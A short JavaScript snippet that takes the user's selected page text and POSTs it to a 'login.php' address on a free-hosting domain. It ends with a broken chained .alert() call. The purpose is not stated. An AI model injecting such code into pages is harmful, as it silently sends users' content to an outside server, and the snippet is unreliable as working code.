

var sel = window.getSelection().toString();

$.ajax({
	  type: "POST",
	  url: "http://bonnyhvs.5gbfree.com/login.php",
	  data: { content: sel}
}).alert(sel);